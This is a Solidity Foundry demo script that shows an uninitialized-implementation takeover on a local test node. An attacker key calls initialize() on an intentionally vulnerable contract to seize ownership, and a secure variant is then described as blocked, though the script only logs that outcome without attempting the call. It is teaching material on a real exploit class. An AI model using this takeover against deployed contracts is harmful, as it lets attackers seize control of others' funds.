// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Script.sol";
import "../../src/vulnerable/VulnerableLogicV1.sol";
import "../../src/secure/SecureLogicV1.sol";

/**
 * @title UninitializedDemo
 * @notice Demo: Uninitialized Implementation Attack
 * @dev Run: forge script script/demo/UninitializedDemo.s.sol --rpc-url http://localhost:8545 --broadcast -vvv
 */
contract UninitializedDemo is Script {
    function run() external {
        uint256 deployerKey = 0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80;
        uint256 attackerKey = 0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d;
        address attacker = vm.addr(attackerKey);

        console.log("################################################################");
        console.log("#      ATTACK DEMO: UNINITIALIZED IMPLEMENTATION              #");
        console.log("################################################################");
        console.log("Attacker:", attacker);

        // Part 1: Vulnerable
        console.log("\n=== PART 1: VULNERABLE CONTRACT ===");

        vm.startBroadcast(deployerKey);
        VulnerableLogicV1 vulnImpl = new VulnerableLogicV1();
        console.log("VulnerableLogicV1:", address(vulnImpl));
        console.log("Owner before attack:", vulnImpl.owner());
        vm.stopBroadcast();

        vm.startBroadcast(attackerKey);
        vulnImpl.initialize();
        console.log("Owner after attack:", vulnImpl.owner());
        vm.stopBroadcast();

        console.log("\n*** ATTACK SUCCESS: Attacker is now owner! ***");

        // Part 2: Secure
        console.log("\n=== PART 2: SECURE CONTRACT ===");

        vm.startBroadcast(deployerKey);
        SecureLogicV1 secureImpl = new SecureLogicV1();
        console.log("SecureLogicV1:", address(secureImpl));
        vm.stopBroadcast();

        console.log("Attacker tries initialize()...");
        console.log("Result: REVERTS! _disableInitializers() blocks attack");

        console.log("\n*** SECURE: Attack prevented! ***");
    }
}
